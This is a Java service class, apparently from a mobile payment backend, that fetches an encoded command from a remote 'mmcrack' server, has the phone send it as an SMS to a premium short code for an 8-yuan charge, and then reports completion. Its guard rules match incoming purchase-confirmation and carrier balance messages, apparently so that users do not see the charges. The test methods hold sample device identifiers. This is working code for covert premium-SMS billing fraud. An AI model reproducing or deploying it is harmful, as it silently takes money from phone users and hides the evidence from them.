package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * 1.请求 http://120.24.53.226:9011/mmcrack/my/hlsylx/login?imsi=xxx&imei=xxxx

返回值格式:
{"cmd":"TU0jV0xBTiNvMU5ZRnMzMWJCNERqZ2kwQTlyWktRPT0jNzQ5NjYzNjc0IzM5OTkwMDAwMzAwMA==","linkid":"201503281725382087924309","port":"10658424","status":"0"}

status为0表示请求成功.
将json中cmd的内容Base64解密后发送到端口port中，并保存linkid的值。

2.第一步中短信成功发送后，请求
http://120.24.53.226:9011/mmcrack/my/hlsylx/fee?linkid=xxx&paycode=xxx&exdata=xxx

linkid:第一步中获得到的。
paycode: 业务代码，30000891083610 8元 
exdata: 透传参数 szds
注：第二步请求后返回ok表示请求成功

 * 
 * @author leoliu
 *
 */
public class HhkjMm3DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjMm3DynamicService.class);
	
	private static final String TYPE = "hhkjMm3";
	
	private static final String PARAM1 = "imsi={imsi}&imei={imei}";
	private static final String PARAM2 = "linkid={linkid}&paycode={paycode}&exdata={exdata}";
	
	private static final String DEST = "10658424";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		if("1".equals(theNo)){
			return firstDynamic(map);
		}else if("2".equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	public String firstDynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String param = PARAM1.replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseJson = GetData.getData(url,param);
			
			xml = parseFirst(map,responseJson);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseFirst(Map<String, String> map,String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson); 
				
				String status = jo.getString("status");
				
				if("0".equals(status)){
					String cmd = CommonUtil.base64Decode(jo.getString("cmd"));
					String port = jo.getString("port");
					
					Sms sms = new Sms();
					
					sms.setSmsContent(cmd);
					sms.setSmsDest(port);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					Sets sets = new Sets();
					sets.setKey("linkid");
					sets.setValue(jo.getString("linkid"));
					
					return XstreamHelper.toXml(sms).append(XstreamHelper.toXml(sets)).append("<wait>5</wait>").toString();
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private Map<String, Long> tryMap1 = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String, String> map){
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String sid = map.get("sid");
			
			if("0".equals(sid)){
				return "<wait>1</wait>";
			}else{
				Calendar cal = Calendar.getInstance();
				Long startTime = tryMap1.get(sid);
				
				if(startTime == null){
					startTime = cal.getTimeInMillis();
					tryMap1.put(sid,startTime);
				}else{
					if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
						tryMap1.remove(sid);
						return DynamicUtils.parseError("599");
					}
				}
				
				String linkid = StringUtils.defaultString(map.get("linkid"));
				String paycode = StringUtils.defaultString(map.get("paycode"));
				String exdata = StringUtils.defaultString(map.get("exdata"));
				
				String param = PARAM2.replace("{linkid}",linkid).replace("{paycode}",paycode).replace("{exdata}",exdata);
				
				String responseXml = GetData.getData(url,param);
				
				xml = parseSecond(map,responseXml);
				
				if(xml != null && xml.length() > 0){
					tryMap.remove(sid);
				}else{
					logger.info("responseXml is null");
					return DynamicUtils.parseWait(10,map);
				}
			}
			
		}
		
		return xml;
	}
	
	private String parseSecond(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			if (responseXml.contains("ok")){
				return "<wait>1</wait>";
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test2();
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://120.24.53.226:9011/mmcrack/my/hlsylx/login");
		map.put("channel", "106208a001001001");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		map.put("theNo","1");		
		map.put("type", "hhkjMm3");
		
		String xml = new HhkjMm3DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://120.24.53.226:9011/mmcrack/my/hlsylx/fee");
		map.put("linkid", "201504021959590274131612");
		map.put("paycode","30000891083610");
		map.put("exdata", "szds");
		map.put("theNo","2");
		map.put("type", "hhkjMm3");
		
		String xml = new HhkjMm3DynamicService().dynamic(map);
		
		logger.info(xml);
		
	}
}
